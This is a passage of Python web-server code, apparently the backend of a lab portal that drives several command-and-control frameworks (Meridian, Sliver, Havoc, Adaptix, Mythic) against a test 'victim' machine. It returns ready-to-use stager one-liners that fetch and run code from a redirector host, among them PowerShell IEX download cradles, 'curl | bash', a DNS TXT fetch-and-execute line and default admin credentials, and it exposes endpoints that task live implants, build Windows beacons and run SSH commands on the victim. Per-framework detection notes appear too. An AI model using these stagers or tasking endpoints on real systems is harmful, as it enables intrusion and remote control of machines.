    return {
        "original_payload": req.payload_text,
        "byte_length": len(raw_bytes),
        "base32_length": len(b32_encoded),
        "total_packets": total_chunks,
        "session_id": req.session_id,
        "domain_suffix": req.domain_suffix,
        "encryption_cipher": "X25519 ECDH + HKDF-SHA256 + AES-256-GCM",
        "wire_protocol": "UDP DNS Port 5353 (Host: 15353)",
        "packets": dissected_packets,
        "educational_notes": [
            "Why Base32? Base32 uses only A-Z and 2-7, which comply strictly with RFC 1035 case-insensitive DNS hostname characters.",
            "Why 36-byte chunks? DNS labels cannot exceed 63 bytes. Meridian caps chunks at 36 chars to ensure sequence headers and domain suffix fit comfortably.",
            "Why UDP 15353? Windows mDNS occupies 5353 on the host; C2Stack maps host UDP 15353 to the container's 5353 port.",
            "Defensive Detection: High-frequency TXT lookups with high Shannon entropy are prime targets for Sigma rules and Zeek DNS log analysis.",
        ],
    }


@app.get("/api/payloads")
def get_payload_studio() -> dict[str, Any]:
    """Return command syntax, delivery one-liners, and detection profiles for all 5 frameworks."""
    return {
        "meridian": {
            "name": "Meridian C2",
            "description": "Ultra-lightweight, zero-dependency Go implant with dual HTTP & DNS TXT tunneling.",
            "stagers": {
                "powershell_http": (
                    f'$wc=New-Object Net.WebClient; $wc.Headers.Add("{C2_HEADER_NAME}","{C2_HEADER_VALUE}"); '
                    f'IEX($wc.DownloadString("http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]}"))'
                ),
                "powershell_dns": (
                    f'$cmd = (Resolve-DnsName -Name "init.c2.cadre.local" -Type TXT -Server "{VICTIM_REDIRECTOR_IP}").Strings; '
                    'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)))'
                ),
                "bash_curl": (
                    f'curl -s -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" '
                    f'http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]} | bash'
                ),
                "binary_compile": "GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o parallax-windows-amd64.exe ./implant",
            },
            "detection": {
                "network": "High-frequency DNS TXT queries (UDP/15353) or HTTP requests carrying custom header.",
                "host": "Process execution without disk artifacts if using memory staging.",
                "event_ids": ["Event ID 4688 (Process Creation)", "Sysmon Event ID 22 (DNS Query)"],
            },
        },
        "sliver": {
            "name": "BishopFox Sliver",
            "description": "Enterprise-grade Go implant framework supporting in-memory .NET execution, BOFs, and lateral movement.",
            "stagers": {
                "generate_session": f"sliver > generate --http {VICTIM_REDIRECTOR_IP}:80 --os windows --arch amd64 --save ./implant.exe",
                "powershell_c2": f'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["sliver"]}\', \'$env:TEMP\\svc.exe\'); Start-Process \'$env:TEMP\\svc.exe\'"',
                "execute_assembly": "sliver (session) > execute-assembly /opt/tools/Rubeus.exe triage",
            },
            "detection": {
                "network": "Configurable HTTP C2 profile, mTLS on port 8888, WireGuard tunneling.",
                "host": "CLR loading into unmanaged processes via execute-assembly, RWX memory allocations.",
                "event_ids": ["Sysmon Event ID 7 (Image Loaded - clr.dll)", "Sysmon Event ID 10 (ProcessAccess)"],
            },
        },
        "havoc": {
            "name": "Havoc C2",
            "description": "Modern C++ Demon payload featuring indirect syscalls, API hashing, and Ekko/Zilean sleep masking.",
            "stagers": {
                "demon_build": "Havoc Client -> Attack -> Payload -> Format: Windows EXE/DLL -> Indirect Syscalls: Enabled -> Sleep Technique: Ekko",
                "delivery": f'curl -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["havoc"]} -o payload.exe',
            },
            "detection": {
                "network": "HTTP/HTTPS heartbeats with custom user-agents and jitter.",
                "host": "Sleep obfuscation changes thread permissions to RW/RX dynamically.",
                "event_ids": ["Sysmon Event ID 8 (CreateRemoteThread)", "Sysmon Event ID 1 (Process Creation)"],
            },
        },
        "adaptix": {
            "name": "Adaptix C2",
            "description": "Go-based post-exploitation teamserver for multiplayer operations with Gopher TCP agent.",
            "stagers": {
                "client_connect": f"Adaptix Qt GUI Client -> Endpoint: {VICTIM_REDIRECTOR_IP}:4321 -> User: operator (or headless REST: POST /endpoint/login, see Module 4)",
                "stager_cmd": f'powershell -c "Invoke-WebRequest -Uri http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["adaptix"]} -OutFile agent.exe"',
            },
            "detection": {
                "network": "Raw TCP/mTLS egress or HTTP sync calls on port 80.",
                "host": "Beacon check-in routines and thread injection.",
                "event_ids": ["Sysmon Event ID 3 (Network Connection)"],
            },
        },
        "mythic": {
            "name": "Mythic C2",
            "description": "Multi-agent collaborative framework (Apollo for Windows, Poseidon for Linux/macOS). Latest stable = 3.4.0.61 (v4 ships profiles built-in, not yet GA).",
            "stagers": {
                "rest_login": f"curl -s http://{VICTIM_REDIRECTOR_IP}:7443/auth -X POST -H 'Content-Type: application/json' -d '{{\"username\":\"mythic_admin\",\"password\":\"mythic\"}}'",
                "payload_build": f"create_c2parameter_instance_webhook -> start_stop_profile_webhook -> createpayload_webhook (payloadDefinition JSON-STRING, build_parameters as LIST; C2 shape: bare callback_host http://{VICTIM_REDIRECTOR_IP} + full-path post_uri /cdn/media/stream/data) -> download exe via GET /direct/download/<uuid>. Verified working incl. keying + COFF; see Docker/mythic/README.md and Module 5.",
                "ui_url": f"http://{VICTIM_REDIRECTOR_IP}:7443 (REST/psql surface; the browser UI is upstream optional containers we don't ship)",
            },
            "detection": {
                "network": "Customizable HTTP profile mimicking common CDN streaming services.",
                "host": "Assembly loading, named pipe IPC.",
                "event_ids": ["Sysmon Event ID 17/18 (Pipe Created/Connected)"],
            },
        },
    }


# ============================================================================
# Real backend operations (tasking, payloads, victim) - see c2backends.py
# ============================================================================
import c2backends as cb  # noqa: E402


class TaskRequest(BaseModel):
    session_id: str = Field(..., description="Session/callback id")
    backend: str = Field(..., description="meridian | mythic | havoc | adaptix | sliver")
    command: str = Field(..., description="Raw command line (alias commands take "
                                           "a plain string, not JSON)")
    callback_id: int | None = Field(None, description="Mythic callback id")
    wait: int = Field(25, description="Seconds to collect output")
    upload_data_b64: str | None = Field(
        None, description="Havoc `upload` file bytes (base64); required with "
                           "`upload <remote-path>` since the wire carries "
                           "b64(remote)+b64(content)")


@app.get("/api/ops/summary")
def ops_summary() -> dict[str, Any]:
    """What the portal can actually DO right now, probed live."""
    out: dict[str, Any] = {}
    try:
        rows = cb.mythic_psql(
            "SELECT id, name, container_running FROM payloadtype;",
            ["id", "name", "container_running"])
        out["mythic"] = {
            "ok": True,
            "payload_types": [{"id": r.get("id"), "name": r.get("name"),
                               "running": r.get("container_running") == "t"}
                              for r in rows],
        }
    except Exception as exc:  # noqa: BLE001
        out["mythic"] = {"ok": False, "error": str(exc)[:200]}
    try:
        cbs = cb.mythic_psql("SELECT id, name, container_running FROM c2profile ORDER BY id;",
                             ["id", "name", "container_running"])
        out["mythic"]["c2_profiles"] = [
            {"id": r.get("id"), "name": r.get("name"), "running": r.get("container_running") == "t"}
            for r in cbs
        ]
    except Exception as exc:  # noqa: BLE001
        out["mythic"]["c2_profiles_error"] = str(exc)[:200]
    try:
        out["meridian"] = {"ok": True, "sessions": len(cb.meridian_sessions())}
    except Exception as exc:  # noqa: BLE001
        out["meridian"] = {"ok": False, "error": str(exc)[:200]}
    out["victim_ws01"] = {"reachable": cb.ws01_reachable(), "ssh_target": cb.WS01_SSH}

    # Adaptix: official REST API at /endpoint (login -> listeners/agents).
    try:
        import adaptix_client as ax
        ac = ax.AdaptixClient()
        ac.login()
        out["adaptix"] = {
            "ok": True,
            "auth": "rest /endpoint/login",
            "listeners": ac.list_listeners(),
        }
    except Exception as exc:  # noqa: BLE001
        out["adaptix"] = {"ok": False, "error": str(exc)[:300]}

    # Havoc: teamserver state is visible in its logs; no REST API exists in 0.7.
    out["havoc"] = {
        "ok": True,
        "note": ("Havoc 0.7 exposes NO REST/gRPC API - the operator protocol is "
                 "WebSocket+TLS on 40056. The portal drives it via a raw "
                 "WebSocket client (see /api/ops/havoc/*)."),
        "teamserver": f"havoc:{os.environ.get('HAVOC_TS_PORT', '40056')} "
                        "(operator WebSocket; victim-facing callback goes "
                        "through the redirector, not here)",
        "user": "5pider",
    }
    out["redirector"] = {
        "decoy": cb.probe_redirector("/", timeout=5.0),
        "meridian": cb.probe_redirector("/gateway/v1/telemetry/",
                                        {"X-Request-ID": os.environ.get(
                                            "C2_HEADER_VALUE", "cadre-c2")}, timeout=5.0),
    }
    return out


@app.post("/api/ops/task")
def ops_task(req: TaskRequest) -> dict[str, Any]:
    """Queue a real command against a live session, on any backend.

    Each framework gets its own calling convention - the caller passes the
    native syntax for that framework:
      mythic    the raw command line; `shell` is an alias so params must be
                the plain string, not JSON
      meridian  the raw command line
      adaptix   an AxScript command (getuid, ls <dir>, ps list,
                shell <cmdline>, powershell <cmdline>)
      havoc     a shell command line; the portal wraps it in the ProcModule
                task the GUI builds
      sliver    a program + arguments line, executed directly with NO shell
                (no `>`, `|`, `&&`). For shell features wrap explicitly, e.g.
                `cmd.exe "/c whoami > C:\\out.txt"`. Sessions only: beacons
                cannot be tasked with --use.
    """
    try:
        if req.backend == "meridian":
            return {"ok": True, "backend": "meridian",
                    "result": cb.meridian_exec(req.session_id, req.command)}
        if req.backend == "mythic":
            import time as _time
            client = cb.MythicClient()
            cid = req.callback_id if req.callback_id is not None else int(req.session_id)
            # `shell` is an ALIAS command: params is the RAW command line, not JSON.
            out = client.post("/api/v1.4/create_task_webhook",
                              {"input": {"command": "shell", "params": req.command,
                                         "callback_id": cid}})
            task_id = out.get("id")
            # task.stdout never carries output in this stack (see matrix
            # §1.3); poll the response table where the agent's real output
            # lands (callback interval 10s + jitter, so allow the wait).
            output: list[str] = []
            if task_id:
                stop = _time.time() + max(5.0, float(req.wait))
                while _time.time() < stop:
                    output = cb.mythic_task_output(task_id)
                    if output:
                        break
                    _time.sleep(5)
            return {"ok": True, "backend": "mythic",
                    "result": {**out, "output": "\n".join(output)}}
        if req.backend == "adaptix":
            import adaptix_client as ax
            ac = ax.AdaptixClient()
            ac.login()
            return {"ok": True, "backend": "adaptix",
                    "result": ac.agent_command_raw(req.session_id, req.command),
                    "results": ac.completed_tasks(req.session_id, limit=10)}
        if req.backend == "havoc":
            import havoc_client as hv
            return {"ok": True, "backend": "havoc",
                    "result": hv._run(hv.HavocClient().run(
                        req.session_id, req.command, wait=float(req.wait),
                        upload_data_b64=req.upload_data_b64))}
        if req.backend == "sliver":
            import sliver_client as sc
            return {"ok": True, "backend": "sliver",
                    "result": sc.task(req.session_id, req.command)}
        raise HTTPException(status_code=400,
                            detail=f"unsupported backend '{req.backend}'")
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/sessions")
def ops_sessions() -> dict[str, Any]:
    """Live sessions across every framework that can be queried headlessly.

    Backends are independent: each reports its own error rather than being
    silently dropped, and nothing is invented when a backend is unreachable.
    """
    sessions: list[dict[str, Any]] = []
    backends: dict[str, Any] = {}

    try:
        rows = cb.mythic_psql(
            "SELECT id, host, user, pid, os, architecture, active, dead, "
            "process_name, description FROM callback ORDER BY id DESC LIMIT 50;",
            ["id", "host", "user", "pid", "os", "architecture", "active", "dead",
             "process_name", "description"])
        for r in rows:
            sessions.append({
                "id": str(r.get("id")),
                "backend": "mythic",
                "hostname": r.get("host") or "?",
                "username": r.get("user") or "?",
                "os": f"{r.get('os','?')} {r.get('architecture','')}".strip(),
                "pid": r.get("pid"),
                "process": r.get("process_name") or "?",
                "description": r.get("description") or "",
                "is_alive": r.get("active") == "t" and r.get("dead") == "f",
            })
        backends["mythic"] = {"ok": True, "count": len(rows)}
    except Exception as exc:  # noqa: BLE001
        backends["mythic"] = {"ok": False, "error": str(exc)[:200]}

    try:
        m = cb.meridian_sessions()
        sessions.extend(m)
        backends["meridian"] = {"ok": True, "count": len(m)}
    except Exception as exc:  # noqa: BLE001
        backends["meridian"] = {"ok": False, "error": str(exc)[:200]}

    try:
        import havoc_client as hv
        h = hv._run(hv.HavocClient().list_sessions())
        for s in h:
            sessions.append({
                "id": s["id"], "backend": "havoc",
                "hostname": s.get("computer") or "?",
                "username": s.get("username") or "?",
                "os": " ".join(x for x in (s.get("os"), s.get("os_build")) if x),
                "pid": s.get("pid"), "is_alive": True,
                "elevated": s.get("elevated"),
                "process": s.get("process"),
                "listener": s.get("listener"),
                "sleep": s.get("sleep"),
            })
        backends["havoc"] = {"ok": True, "count": len(h)}
    except Exception as exc:  # noqa: BLE001
        backends["havoc"] = {"ok": False, "error": str(exc)[:200]}

    try:
        import adaptix_client as ax
        ac = ax.AdaptixClient()
        ac.login()
        agents = ac.list_agents() or []
        if isinstance(agents, dict):
            agents = agents.get("agents") or agents.get("data") or []
        for a in agents:
            sessions.append({
                "id": str(a.get("a_id")), "backend": "adaptix",
                "hostname": a.get("a_computer") or "?",
                "username": a.get("a_username") or "?",
                "os": a.get("a_os_desc") or "?",
                "pid": a.get("a_pid"), "is_alive": True,
                "elevated": a.get("a_elevated"),
                "process": a.get("a_process"),
                "listener": a.get("a_listener"),
                "domain": a.get("a_domain"),
                "internal_ip": a.get("a_internal_ip"),
            })
        backends["adaptix"] = {"ok": True, "count": len(agents)}
    except Exception as exc:  # noqa: BLE001
        backends["adaptix"] = {"ok": False, "error": str(exc)[:200]}

    try:
        import sliver_client as sc
        sl = sc.sessions()
        for s in sl:
            s["backend"] = "sliver"
            sessions.append(s)
        backends["sliver"] = {"ok": True, "count": len(sl)}
    except Exception as exc:  # noqa: BLE001
        backends["sliver"] = {"ok": False, "error": str(exc)[:200]}

    return {"count": len(sessions), "sessions": sessions, "backends": backends}


@app.get("/api/ops/results")
def ops_results(backend: str, session_id: str | None = None) -> dict[str, Any]:
    """Read real task results.

    For mythic, `session_id` is actually a TASK id: output lives in the
    response table per task, not per callback (see matrix §1.3).
    """
    try:
        if backend == "meridian":
            return {"ok": True, "results": cb.meridian_results(session_id)}
        if backend == "mythic":
            return {"ok": True, "results": cb.mythic_task_output(int(session_id))}
        raise HTTPException(status_code=400, detail=f"unsupported backend '{backend}'")
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/probe")
def ops_probe(req: RedirectorTestRequest) -> dict[str, Any]:
    """Actually probe the redirector. Reports the REAL status, byte length and
    whether the decoy was returned."""
    return cb.probe_redirector(req.url_path, req.headers, req.method)


@app.post("/api/ops/victim")
def ops_victim(req: VictimCommandRequest) -> dict[str, Any]:
    """Run a command on ws01 over SSH."""
    result = cb.ws01_exec(req.command, timeout=req.timeout)
    if not result.get("ok") and result.get("returncode") not in (0, None):
        raise HTTPException(status_code=502, detail=result.get("stderr", "ssh failed"))
    return result


@app.post("/api/ops/adaptix/listener")
def ops_adaptix_listener(req: AdaptixListenerRequest) -> dict[str, Any]:
    """Create/ensure the Adaptix HTTP Beacon listener via the REST API."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        cfg = ax.http_listener_config(req.callback_address, req.uri,
                                      req.c2_header, req.c2_header_value, req.port)
        out = ac.create_listener(req.name, cfg)
        return {"ok": True, "listener": req.name, "response": out,
                "listeners": ac.list_listeners()}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/adaptix/agent")
def ops_adaptix_agent(req: AdaptixAgentRequest) -> dict[str, Any]:
    """Build a Windows beacon server-side and return base64 for download."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        cfg = ax.beacon_config(req.sleep, req.jitter, req.arch, req.format)
        data = ac.generate_agent(req.agent, req.listener, cfg, timeout=300)
        return {"ok": True, "agent": req.agent, "listener": req.listener,
                "filename": getattr(ac, "last_filename", "agent.bin"),
                "size": len(data),
                "base64": base64.b64encode(data).decode("ascii")}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/adaptix/agents")
def ops_adaptix_agents() -> dict[str, Any]:
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        return {"ok": True, "agents": ac.list_agents()}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/adaptix/task")
def ops_adaptix_task(req: AdaptixTaskRequest) -> dict[str, Any]:
    """Task an Adaptix agent. Runs server-side via the AxScript engine."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        return {"ok": True, "result": ac.agent_command_raw(req.agent_id, req.cmdline)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/adaptix/results")
def ops_adaptix_results(agent_id: str, limit: int = 50) -> dict[str, Any]:
    """Completed Adaptix tasks WITH output (synchronous, no WebSocket needed)."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        return {"ok": True, "tasks": ac.completed_tasks(agent_id, limit=limit)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/sessions")
def get_fleet_sessions() -> dict[str, Any]:
    """REAL C2 sessions across the frameworks we can query headlessly.

    Backends are queried independently and each reports its own error. A backend
    that is down produces an `error` entry - never invented sessions. (The
    previous version returned fabricated hosts whenever the backend was
    unreachable, which made the dashboard lie about the lab's state.)
    """
    import c2backends as cb

    sessions: list[dict[str, Any]] = []
    backends: dict[str, Any] = {}

    # --- Mythic (real DB) ---
    try:
        rows = cb.mythic_psql(
            "SELECT id, host, user, pid, os, architecture, active, dead "
            "FROM callback ORDER BY id DESC LIMIT 50;"
        )
        for r in rows:
            sessions.append({
                "id": str(r.get("id")),
                "backend": "mythic",
                "hostname": r.get("host") or "?",
                "username": r.get("user") or "?",
                "os": f"{r.get('os','?')} {r.get('architecture','')}".strip(),
                "transport": "http profile",
                "pid": r.get("pid"),
                "is_alive": (r.get("active") == "t" and r.get("dead") == "f"),
            })
        backends["mythic"] = {"ok": True, "count": len(rows)}
    except Exception as exc:  # noqa: BLE001
        backends["mythic"] = {"ok": False, "error": str(exc)[:200]}

    # --- Meridian (real CLI) ---
    try:
        m = cb.meridian_sessions()
        sessions.extend(m)
        backends["meridian"] = {"ok": True, "count": len(m)}
    except Exception as exc:  # noqa: BLE001
        backends["meridian"] = {"ok": False, "error": str(exc)[:200]}

    return {
        "count": len(sessions),
        "sessions": sessions,
        "backends": backends,
        "note": "Live data from Mythic postgres and the Meridian CLI. "
                "Sliver/Havoc/Adaptix sessions are not listed because those "
                "frameworks expose no headless session query.",
    }
